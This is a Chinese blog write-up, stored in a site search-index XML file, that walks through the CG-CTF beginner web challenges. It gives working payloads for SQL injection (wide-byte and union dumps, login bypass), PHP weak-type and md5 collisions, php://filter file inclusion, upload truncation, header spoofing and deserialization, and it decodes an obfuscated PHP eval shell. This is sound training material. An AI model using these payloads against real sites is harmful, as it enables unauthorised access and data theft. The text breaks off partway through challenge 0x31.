<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CG-CTF-WEB</title>
    <url>/2020/03/09/CG-CTF-WEB/</url>
    <content><![CDATA[<h3 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h3><p>作为一名web新手，刷题是很有必要的，而CG-CTF是一个适合新手的做题平台，下面是我对于CG-CTF Web部分的解题思路，希望对大家有所帮助，如有欠缺，欢迎大家进行补充。</p>
<a id="more"></a>

<h1 id="CG-CTF-Web-Writeup"><a href="#CG-CTF-Web-Writeup" class="headerlink" title="CG-CTF Web-Writeup"></a>CG-CTF Web-Writeup</h1><h3 id="地址：https-cgctf-nuptsast-com-challenges-Web"><a href="#地址：https-cgctf-nuptsast-com-challenges-Web" class="headerlink" title="地址：https://cgctf.nuptsast.com/challenges#Web"></a>地址：<a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">https://cgctf.nuptsast.com/challenges#Web</a></h3><h4 id="0x01-签到题（题目地址：http-chinalover-sinaapp-com-web1-）"><a href="#0x01-签到题（题目地址：http-chinalover-sinaapp-com-web1-）" class="headerlink" title="0x01 签到题（题目地址：http://chinalover.sinaapp.com/web1/ ）"></a>0x01 签到题（题目地址：<a href="http://chinalover.sinaapp.com/web1/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web1/</a> ）</h4><p>直接F12，可得到flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/1.png" alt="1"></p>
<h4 id="0x02-md5-collision（题目地址：http-chinalover-sinaapp-com-web19-）"><a href="#0x02-md5-collision（题目地址：http-chinalover-sinaapp-com-web19-）" class="headerlink" title="0x02 md5 collision（题目地址：http://chinalover.sinaapp.com/web19/ ）"></a>0x02 md5 collision（题目地址：<a href="http://chinalover.sinaapp.com/web19/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web19/</a> ）</h4><p>题目提供了源码。</p>
<pre><code>源码（PHP）

$md51 = md5(&apos;QNKCDZO&apos;);
$a = @$_GET[&apos;a&apos;];
$md52 = @md5($a);
if(isset($a)){
if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) {
  echo &quot;nctf{*****************}&quot;;
} else {
    echo &quot;false!!!&quot;;
}}
else{echo &quot;please input a&quot;;}</code></pre><p>考察PHP弱类型以及md5函数漏洞</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>常见的payload有：</p>
<pre><code>QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
 sha1(str)
sha1(&apos;aaroZmOk&apos;)  
sha1(&apos;aaK1STfY&apos;)
sha1(&apos;aaO8zKZF&apos;)
sha1(&apos;aa3OFF9m&apos;)</code></pre><p>构造payload：<code>?a=240610708</code>，出flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/2.png" alt="2"></p>
<h4 id="0x03-签到2（题目地址：http-teamxlc-sinaapp-com-web1-02298884f0724c04293b4d8c0178615e-index-php-）"><a href="#0x03-签到2（题目地址：http-teamxlc-sinaapp-com-web1-02298884f0724c04293b4d8c0178615e-index-php-）" class="headerlink" title="0x03 签到2（题目地址：http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php ）"></a>0x03 签到2（题目地址：<a href="http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php</a> ）</h4><p>提示输入zhimakaimen，输入后无反应，再F12查看源码：</p>
<p><img src="/2020/03/09/CG-CTF-WEB/3.png" alt="3"></p>
<p>发现输入框的maxlength=“10”，此时可以修改前端的maxlength，再次输入口令拿到flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/4.png" alt="4"></p>
<h4 id="0x04-这题不是WEB（题目地址：http-chinalover-sinaapp-com-web2-index-html-）"><a href="#0x04-这题不是WEB（题目地址：http-chinalover-sinaapp-com-web2-index-html-）" class="headerlink" title="0x04 这题不是WEB（题目地址：http://chinalover.sinaapp.com/web2/index.html ）"></a>0x04 这题不是WEB（题目地址：<a href="http://chinalover.sinaapp.com/web2/index.html" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web2/index.html</a> ）</h4><p>一道简单的信息隐藏题，一进来只有一张图片，F12后可知图片名为<code>2.gif</code>，下载后将后缀名改为<code>.txt</code>。flag藏在文件末尾。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/5.png" alt="5"></p>
<h4 id="0x05-层层递进（题目地址：http-chinalover-sinaapp-com-web3-）"><a href="#0x05-层层递进（题目地址：http-chinalover-sinaapp-com-web3-）" class="headerlink" title="0x05 层层递进（题目地址：http://chinalover.sinaapp.com/web3/ ）"></a>0x05 层层递进（题目地址：<a href="http://chinalover.sinaapp.com/web3/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web3/</a> ）</h4><p>正如题目所述，层层递进。</p>
<p>解法一：</p>
<p>F12，发现<code>SO.html</code>，查看后发现<code>S0.html</code>，继续查看发现<code>SO.htm</code>，继续查看发现<code>S0.htm</code>,最后发现<code>404.html</code>，进入后翻开源码找到flag,需要竖着看！</p>
<p><img src="/2020/03/09/CG-CTF-WEB/6.png" alt="6"></p>
<p>解法二：</p>
<p>直接抓包，在<code>404.html</code>文件中找到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/7.png" alt="7"></p>
<h4 id="0x06-AAencode（题目地址：http-homura-cc-CGfiles-aaencode-txt-）"><a href="#0x06-AAencode（题目地址：http-homura-cc-CGfiles-aaencode-txt-）" class="headerlink" title="0x06 AAencode（题目地址：http://homura.cc/CGfiles/aaencode.txt ）"></a>0x06 AAencode（题目地址：<a href="http://homura.cc/CGfiles/aaencode.txt" target="_blank" rel="noopener">http://homura.cc/CGfiles/aaencode.txt</a> ）</h4><p>题目提示：javascript aaencode</p>
<p>打开后是乱码，用utf-8编码查看,发现是一堆颜文字。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/8.png" alt="8"></p>
<p>其实是javascript的加密工具aaencode可以把js转为颜文字符号。</p>
<p>直接<code>ctrl c +ctrl v</code>丢进控制台执行，出来flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/9.png" alt="9"></p>
<h4 id="0x07-单身二十年（题目地址：http-chinalover-sinaapp-com-web8-）"><a href="#0x07-单身二十年（题目地址：http-chinalover-sinaapp-com-web8-）" class="headerlink" title="0x07 单身二十年（题目地址：http://chinalover.sinaapp.com/web8/ ）"></a>0x07 单身二十年（题目地址：<a href="http://chinalover.sinaapp.com/web8/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web8/</a> ）</h4><p>拼手速自然是不可能点出来的。</p>
<p>直接抓包就可以找到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/10.png" alt="10"></p>
<h4 id="0x08-php-decode（无地址）"><a href="#0x08-php-decode（无地址）" class="headerlink" title="0x08 php decode（无地址）"></a>0x08 php decode（无地址）</h4><p>题目源码：</p>
<pre><code>见到的一个类似编码的shell，请解码

&lt;?php
function CLsI($ZzvSWE) {

    $ZzvSWE = gzinflate(base64_decode ($ZzvSWE));

    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) {

        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);

    }

    return $ZzvSWE;

}
eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));
?&gt;</code></pre><p>我们保存后直接运行代码，会报出<code>eval</code>语法错误，将 <code>eval</code>改为<code>echo</code>试着输出解码后的结果，可以直接得到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/11.png" alt="11"></p>
<h4 id="0x09-文件包含（题目地址：http-4-chinalover-sinaapp-com-web7-index-php-）"><a href="#0x09-文件包含（题目地址：http-4-chinalover-sinaapp-com-web7-index-php-）" class="headerlink" title="0x09 文件包含（题目地址：http://4.chinalover.sinaapp.com/web7/index.php ）"></a>0x09 文件包含（题目地址：<a href="http://4.chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web7/index.php</a> ）</h4><p>题目提示：LFI</p>
<p>文件包含题目，使用伪协议<code>php://filter</code>，通过<code>index.php?file=php://filter/convert.base64-encode/resource=</code>分别查看<code>index.php</code>和<code>show.php</code>，解码后发现flag在<code>index.php</code>的末尾。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/12.png" alt="12"></p>
<h4 id="0x10-单身一百年也没用（题目地址：http-chinalover-sinaapp-com-web9-）"><a href="#0x10-单身一百年也没用（题目地址：http-chinalover-sinaapp-com-web9-）" class="headerlink" title="0x10 单身一百年也没用（题目地址：http://chinalover.sinaapp.com/web9/ ）"></a>0x10 单身一百年也没用（题目地址：<a href="http://chinalover.sinaapp.com/web9/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web9/</a> ）</h4><p>单身100年也没用了，看见这种话就直接抓包，用Chrome自带的抓包，发现<code>index.php</code>文件，flag就在响应头中。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/13.png" alt="13"></p>
<h4 id="0x11-Download-（die！）"><a href="#0x11-Download-（die！）" class="headerlink" title="0x11 Download~!（die！）"></a>0x11 Download~!（die！）</h4><h4 id="0x12-COOKIE（题目地址：http-chinalover-sinaapp-com-web10-index-php-）"><a href="#0x12-COOKIE（题目地址：http-chinalover-sinaapp-com-web10-index-php-）" class="headerlink" title="0x12 COOKIE（题目地址：http://chinalover.sinaapp.com/web10/index.php ）"></a>0x12 COOKIE（题目地址：<a href="http://chinalover.sinaapp.com/web10/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web10/index.php</a> ）</h4><p>题目提示：TIP: 0==not<br>截包，修改cookie的值为1即可。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/14.png" alt="14"></p>
<h4 id="0x13-MYSQL（题目地址：http-chinalover-sinaapp-com-web11-）"><a href="#0x13-MYSQL（题目地址：http-chinalover-sinaapp-com-web11-）" class="headerlink" title="0x13 MYSQL（题目地址：http://chinalover.sinaapp.com/web11/ ）"></a>0x13 MYSQL（题目地址：<a href="http://chinalover.sinaapp.com/web11/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web11/</a> ）</h4><p><code>robots.txt</code>是一种爬虫协议，通常存放在根目录下，首先查看<code>robots.txt</code>文件。</p>
<p>出现代码：<br><img src="/2020/03/09/CG-CTF-WEB/15.png" alt="15"></p>
<p>主要考察<code>intval()</code>函数的用法，php官网解释为：<code>获取变量的整数值</code>，所以此题要绕过，需要给<code>id</code>传入整数部分为1024，小数部分为不为0的值即可绕过。注意到是传入<code>sql.php</code>文件中。<br>构造payload：<code>http://chinalover.sinaapp.com/web11/sql.php?id=1024.001</code>，得到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/16.png" alt="16"></p>
<h4 id="0x14-GBK-Injection（题目地址：http-chinalover-sinaapp-com-SQL-GBK-index-php-id-1-）"><a href="#0x14-GBK-Injection（题目地址：http-chinalover-sinaapp-com-SQL-GBK-index-php-id-1-）" class="headerlink" title="0x14 GBK Injection（题目地址：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 ）"></a>0x14 GBK Injection（题目地址：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a> ）</h4><p>本题考察宽字节注入。</p>
<p>当尝试<code>id=1&#39;</code>时，发现<code>&#39;</code>被转义了，在URL中<code>%df</code>与<code>\</code>结合会变成<code>運</code>,现在我们闭合了<code>id</code>的值，接下来在最后使用<code>#</code>，<code>--+</code>或<code>--空格</code>来注释掉最后一个<code>&#39;</code>。</p>
<p>接下来，依次进行爆破。</p>
<ul>
<li>判断sql注入的字段数量，有两个字段。<br><code>id=-1%df&#39; order by 1%23</code>，回显正常。<br><code>id=-1%df&#39; order by 2%23</code>，回显正常。<br><code>id=-1%df&#39; order by 3%23</code>，回显错误。</li>
<li>判断哪个字段是有效字段，第二个字段有效。<br><code>id=-1%df&#39; union select 1,2%23</code>，回显2</li>
<li>爆破数据库，数据库为<code>sae-chinalover</code>。<br><code>id=-1%df&#39; union select 1,database()%23</code></li>
<li>爆破表名，表名为<code>ctf,ctf2,ctf3,ctf4,gbksqli,news</code>。<br><code>id=-1%df&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</code></li>
<li>依次爆破各个表单下的字段名，发现ctf4有列名为flag。（注意！！！：后端过滤掉了表单名）<br><code>id=-1%df&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634%23</code></li>
<li>最后爆破flag。<br><code>id=-1%df&#39; union select 1,flag from ctf4%23</code></li>
</ul>
<p><img src="/2020/03/09/CG-CTF-WEB/17.png" alt="17"></p>
<h4 id="0x15-x00（题目地址：http-teamxlc-sinaapp-com-web4-f5a14f5e6e3453b78cd73899bad98d53-index-php-）"><a href="#0x15-x00（题目地址：http-teamxlc-sinaapp-com-web4-f5a14f5e6e3453b78cd73899bad98d53-index-php-）" class="headerlink" title="0x15 /x00（题目地址：http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php ）"></a>0x15 /x00（题目地址：<a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php</a> ）</h4><p>此题考查<code>ereg()</code>函数绕过，有两种方法。<br>利用<code>%00截断</code>或<code>数组</code>绕过。</p>
<pre><code>?nctf=1%00%23biubiubiu
?nctf[]=%23biubiubiu</code></pre><p><img src="/2020/03/09/CG-CTF-WEB/18.png" alt="18"></p>
<h4 id="0x16-bypass-again（题目地址：http-chinalover-sinaapp-com-web17-index-php-）"><a href="#0x16-bypass-again（题目地址：http-chinalover-sinaapp-com-web17-index-php-）" class="headerlink" title="0x16 bypass again（题目地址：http://chinalover.sinaapp.com/web17/index.php ）"></a>0x16 bypass again（题目地址：<a href="http://chinalover.sinaapp.com/web17/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php</a> ）</h4><p>此题和0x02相似，都是考察PHP弱类型。<br>有两种解法：</p>
<pre><code>?a=240610708&amp;b=QNKCDZO  #利用哈希值。
?a[]=&amp;b[]=111           #利用md5()不能处理数组。</code></pre><p><img src="/2020/03/09/CG-CTF-WEB/19.png" alt="19"></p>
<h4 id="0x17-变量覆盖（题目地址：http-chinalover-sinaapp-com-web18-index-php-）"><a href="#0x17-变量覆盖（题目地址：http-chinalover-sinaapp-com-web18-index-php-）" class="headerlink" title="0x17 变量覆盖（题目地址：http://chinalover.sinaapp.com/web18/index.php ）"></a>0x17 变量覆盖（题目地址：<a href="http://chinalover.sinaapp.com/web18/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web18/index.php</a> ）</h4><pre><code>&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { ?&gt;
                  &lt;?php
                  extract($_POST);
                  if ($pass == $thepassword_123) { ?&gt;
                      &lt;div class=&quot;alert alert-success&quot;&gt;
                          &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;
                      &lt;/div&gt;
                  &lt;?php } ?&gt;
              &lt;?php } ?&gt;</code></pre><p>extract()函数的$extract_type缺省值为1，若没有另外指定，函数将覆盖已有变量。<br>所以传入<code>pass</code>和<code>thepassword_123</code>相等即可。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/21.png" alt="21"></p>
<h4 id="0x18-PHP是世界上最好的语言（die！）"><a href="#0x18-PHP是世界上最好的语言（die！）" class="headerlink" title="0x18 PHP是世界上最好的语言（die！）"></a>0x18 PHP是世界上最好的语言（die！）</h4><h4 id="0x19-伪装者（http-chinalover-sinaapp-com-web4-xxx-php-）"><a href="#0x19-伪装者（http-chinalover-sinaapp-com-web4-xxx-php-）" class="headerlink" title="0x19 伪装者（http://chinalover.sinaapp.com/web4/xxx.php ）"></a>0x19 伪装者（<a href="http://chinalover.sinaapp.com/web4/xxx.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web4/xxx.php</a> ）</h4><p>根据题目意思，需要伪装在本地登陆。可能要用到<code>client-ip</code>或者<code>x-forwarded-for</code>。<br>截包，添加字段<code>client-ip:127.0.0.1</code>。获得flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/20.png" alt="20"></p>
<h4 id="0x20-Header（die！）"><a href="#0x20-Header（die！）" class="headerlink" title="0x20 Header（die！）"></a>0x20 Header（die！）</h4><h4 id="0x21-上传绕过（题目地址：http-teamxlc-sinaapp-com-web5-21232f297a57a5a743894a0e4a801fc3-index-html-）"><a href="#0x21-上传绕过（题目地址：http-teamxlc-sinaapp-com-web5-21232f297a57a5a743894a0e4a801fc3-index-html-）" class="headerlink" title="0x21 上传绕过（题目地址：http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html ）"></a>0x21 上传绕过（题目地址：<a href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html</a> ）</h4><p>首先随便上传一个文件，提示要上传<code>jpg,gif,png后缀的文件</code>，再上传<code>.jpg</code>文件，又要求上传<code>.php</code>文件，上传<code>.php</code>时，又出了问题。</p>
<p>首先，手动构造一个<code>1.php.jpg</code>文件，然后抓包。利用<code>00</code>截断上传绕过。</p>
<p>原理：00截断是文件后缀名就一个%00字节，可以截断某些函数对文件名的判断，在许多语言函数中，处理字符串的函数中0x00被认为是终止符。</p>
<p>在二进制编码中找到文件的位置，将php后面的值改为<code>00</code>，然后GO一下就得到flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/22.png" alt="22"></p>
<h4 id="0x22、SQL注入1（题目地址：http-chinalover-sinaapp-com-index-php-）"><a href="#0x22、SQL注入1（题目地址：http-chinalover-sinaapp-com-index-php-）" class="headerlink" title="0x22、SQL注入1（题目地址：http://chinalover.sinaapp.com/index.php ）"></a>0x22、SQL注入1（题目地址：<a href="http://chinalover.sinaapp.com/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/index.php</a> ）</h4><p>题目给出源代码：</p>
<pre><code>&lt;?php
if($_POST[user] &amp;&amp; $_POST[pass]) {
        mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
    mysql_select_db(SAE_MYSQL_DB);
    $user = trim($_POST[user]);
    $pass = md5(trim($_POST[pass]));
    $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;
        echo &apos;&lt;/br&gt;&apos;.$sql;
    $query = mysql_fetch_array(mysql_query($sql));
    if($query[user]==&quot;admin&quot;) {
          echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;
    }
    if($query[user] != &quot;admin&quot;) {
        echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);
    }
}
echo $query[user];
?&gt;</code></pre><p>此题为SQL注入，主要在于拼接sql语句的时候能够查询出user为admin的结果，此处只需要闭合user参数并注释掉后面的语句即可。</p>
<p>构造payload：</p>
<p><img src="/2020/03/09/CG-CTF-WEB/23.png" alt="23"></p>
<p>拿到flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/24.png" alt="24"></p>
<h4 id="0x23、pass-check（题目地址：http-chinalover-sinaapp-com-web21-）"><a href="#0x23、pass-check（题目地址：http-chinalover-sinaapp-com-web21-）" class="headerlink" title="0x23、pass check（题目地址：http://chinalover.sinaapp.com/web21/ ）"></a>0x23、pass check（题目地址：<a href="http://chinalover.sinaapp.com/web21/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web21/</a> ）</h4><p>题目给出了源代码：</p>
<pre><code>$pass=@$_POST[&apos;pass&apos;];
$pass1=***********;//被隐藏起来的密码
if(isset($pass))
{
if(@!strcmp($pass,$pass1)){
echo &quot;flag:nctf{*}&quot;;
}else{
echo &quot;the pass is wrong!&quot;;
}
}else{
echo &quot;please input pass!&quot;;
}
?&gt;</code></pre><p>考察<code>strcmp()</code>弱类型，传入数组时会返回null。所以<code>post</code>的数据为<code>pass[]=1</code>可以获取flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/25.png" alt="25"></p>
<h4 id="0x24、起名字真难（题目地址：http-chinalover-sinaapp-com-web12-index-php-）"><a href="#0x24、起名字真难（题目地址：http-chinalover-sinaapp-com-web12-index-php-）" class="headerlink" title="0x24、起名字真难（题目地址：http://chinalover.sinaapp.com/web12/index.php ）"></a>0x24、起名字真难（题目地址：<a href="http://chinalover.sinaapp.com/web12/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web12/index.php</a> ）</h4><p>题目给出了源码：</p>
<pre><code>&lt;?php
function noother_says_correct($number)
{
    $one = ord(&apos;1&apos;);
       $nine = ord(&apos;9&apos;);
       for ($i = 0; $i &lt; strlen($number); $i++)
       {   
               $digit = ord($number{$i});
               if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
              {
                      return false;
             }
       }
       return $number == &apos;54975581388&apos;;
}
$flag=&apos;*******&apos;;
if(noother_says_correct($_GET[&apos;key&apos;]))
   echo $flag;
else 
   echo &apos;access denied&apos;;
?&gt;</code></pre><p>分析源码可得知：传入<code>key</code>的值中不能包含<code>1-9</code>的数字，但要和<code>54975581388</code>相等，此处转化为十六进制<code>0xccccccccc</code>即可获取到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/26.png" alt="26"></p>
<h4 id="0x25、密码重置（题目地址：-http-nctf-nuptzj-cn-web13-index-php-user1-Y3RmdXNlcg-）"><a href="#0x25、密码重置（题目地址：-http-nctf-nuptzj-cn-web13-index-php-user1-Y3RmdXNlcg-）" class="headerlink" title="0x25、密码重置（题目地址：(http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg==) ）"></a>0x25、密码重置（题目地址：(<a href="http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg==" target="_blank" rel="noopener">http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg==</a>) ）</h4><p>在<code>post</code>传参时发现还有<code>get</code>传参的<code>user1</code>，初始值为<code>ctfuser</code>经过<code>base64编码</code>的值，题目要求修改<code>user=admin</code>的密码，所以将<code>user1</code>的值改为<code>admin</code>的<code>base64编码</code>加密后的值<code>YWRtaW4=</code>，<code>user</code>的值改为<code>admin</code>。即可获取flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/27.png" alt="27"><br><img src="/2020/03/09/CG-CTF-WEB/28.png" alt="28"></p>
<h4 id="0x26、php-反序列化（题目地址：http-4-chinalover-sinaapp-com-web25-index-php-）"><a href="#0x26、php-反序列化（题目地址：http-4-chinalover-sinaapp-com-web25-index-php-）" class="headerlink" title="0x26、php 反序列化（题目地址：http://4.chinalover.sinaapp.com/web25/index.php ）"></a>0x26、php 反序列化（题目地址：<a href="http://4.chinalover.sinaapp.com/web25/index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web25/index.php</a> ）</h4><p>题目给出源代码：</p>
<pre><code>&lt;?php
class just4fun {
  var $enter;
 var $secret;
}

if (isset($_GET[&apos;pass&apos;])) {
 $pass = $_GET[&apos;pass&apos;];

 if(get_magic_quotes_gpc()){
      $pass=stripslashes($pass);
  }

  $o = unserialize($pass);

 if ($o) {
     $o-&gt;secret = &quot;*&quot;;
        if ($o-&gt;secret === $o-&gt;enter)
          echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;
       else 
           echo &quot;Oh no... You can&apos;t fool me&quot;;
    }
    else echo &quot;are you trolling?&quot;;
?&gt;</code></pre><p>本题考点在于反序列化后，secret会被重新赋值为一个未知的值，但要求enter跟secret的值一致才能拿到flag。<br>这里主要考察一个知识点：对象包含的引用在序列化时也会被存储。<br>我们通过将secret的引用赋值给enter，这样就可以同步变化，绕过验证。</p>
<p>编写脚本：</p>
<pre><code>&lt;?php
class just4fun {
  var $enter;
 var $secret;
}

$exp = new just4fun();
$exp -&gt; enter = &amp;$exp -&gt; secret;
$pass = serialize($exp);
print_r($pass);
?&gt;</code></pre><p>得到payload：<code>O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}</code></p>
<p>但是没有flag。题目提示目前没法做，可能就是原因。</p>
<h4 id="0x27、SQL-Injection（题目地址：http-chinalover-sinaapp-com-web15-index-php-）"><a href="#0x27、SQL-Injection（题目地址：http-chinalover-sinaapp-com-web15-index-php-）" class="headerlink" title="0x27、SQL Injection（题目地址：http://chinalover.sinaapp.com/web15/index.php ）"></a>0x27、SQL Injection（题目地址：<a href="http://chinalover.sinaapp.com/web15/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web15/index.php</a> ）</h4><p>题目提示：<code>TIP:反斜杠可以用来转义 仔细查看相关函数的用法。</code></p>
<p>用<code>view-source</code>查看源码。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/29.png" alt="29"></p>
<p><code>stripslashes</code>函数用于去掉<code>\</code>，返回一个去除转义反斜线后的字符串（\‘ 转换为 ‘ 等等）。双反斜线（\\）被转换为单个反斜线（\）。 </p>
<p><code>htmlentities — 将字符转换为 HTML 转义字符</code></p>
<p>由于<code>htmllentities</code>函数会使<code>&#39;</code>失效，所以我们无法闭合源代码中的<code>&#39;</code>，根据题目提示灵活使用转义字符<code>\</code>。</p>
<p>拿出SQL注入语句<code>&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;</code>来分析。</p>
<p>首先name=后面的’&#39;‘将第一个<code>&#39;</code>转移，剩下的<code>&#39;</code>作为语句开头。</p>
<p>接下来到了问题关键处，pass=后面只能转义一个<code>&#39;</code>，所以剩下的那个<code>&#39;</code>只能作为语句的闭合标志。因此我们需要将$username后面的<code>&#39;</code>全部转义。这里就要用到’&#39;。</p>
<p>接下来就简单了，构造payload：<code>?username=admin \&amp;password=or 1=1%23</code></p>
<p>传入的SQL语句变为：<br><code>SELECT * FROM users WHERE name=&#39;admin \&#39; AND pass=&#39; or 1=1</code></p>
<p>得到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/30.png" alt="30"></p>
<h4 id="0x28、综合题（题目地址：http-teamxlc-sinaapp-com-web3-b0b0ad119f425408fc3d45253137d33d-index-php-）"><a href="#0x28、综合题（题目地址：http-teamxlc-sinaapp-com-web3-b0b0ad119f425408fc3d45253137d33d-index-php-）" class="headerlink" title="0x28、综合题（题目地址：http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php ）"></a>0x28、综合题（题目地址：<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php</a> ）</h4><p>进入题目出现一堆代码，经查看后，是jsfuck，可以直接丢进控制台运行。得到<code>1bc29b36f623ba82aaf6724fd3b16718.php</code>，查看这个文件，提示TIP在脑袋里。<br>脑袋———header，在header中找到tip</p>
<p><img src="/2020/03/09/CG-CTF-WEB/31.png" alt="31"></p>
<p>提示<code>history of bash</code>，是指让我们去查看根目录下的<code>.bash_history</code>文件。</p>
<p>得到压缩命令：<code>zip -r flagbak.zip ./*</code></p>
<p>我们下载<code>flagbak.zip</code>文件，找到其中的<code>flag.txt</code>文件打开得到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/32.png" alt="32"></p>
<h4 id="0x29-system（die！）"><a href="#0x29-system（die！）" class="headerlink" title="0x29 system（die！）"></a>0x29 system（die！）</h4><h4 id="0x30-SQL注入2（题目地址：http-4-chinalover-sinaapp-com-web6-index-php-）"><a href="#0x30-SQL注入2（题目地址：http-4-chinalover-sinaapp-com-web6-index-php-）" class="headerlink" title="0x30 SQL注入2（题目地址：http://4.chinalover.sinaapp.com/web6/index.php ）"></a>0x30 SQL注入2（题目地址：<a href="http://4.chinalover.sinaapp.com/web6/index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web6/index.php</a> ）</h4><p>首先查看题目给出的源码：</p>
<p><img src="/2020/03/09/CG-CTF-WEB/33.png" alt="33"></p>
<p>分析代码：</p>
<ul>
<li>题目提示主要考察union查询</li>
<li>用post方法传入user和pass变量。</li>
<li>传入的pass变量经过md5()加密。</li>
<li>query[pw]中储存的是结果。</li>
<li>如果query[pw]中的结果与pass相等，即可得到flag</li>
<li>既然我们不知道结果中有什么，那么就构造一个结果来利用。</li>
</ul>
<p>构造payload：</p>
<pre><code>user=&apos;union select md5(1)#    #开头&apos;用于闭合user前面的&apos;，后面的#用于注释掉后面的&apos;
pass=1                        #对应md5(1)</code></pre><p><img src="/2020/03/09/CG-CTF-WEB/34.png" alt="34"></p>
<h4 id="0x31综合题2（题目地址：http-cms-nuptzj-cn-）"><a href="#0x31综合题2（题目地址：http-cms-nuptzj-cn-）" class="headerlink" title="0x31综合题2（题目地址：http://cms.nuptzj.cn/ ）"></a>0x31综合题2（题目地址：<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">http://cms.nuptzj.cn/</a> ）</h4><p>进入题目是一块留言板，先随便玩玩。</p>
<p>先来看留言搜索，输入1试试，</p>
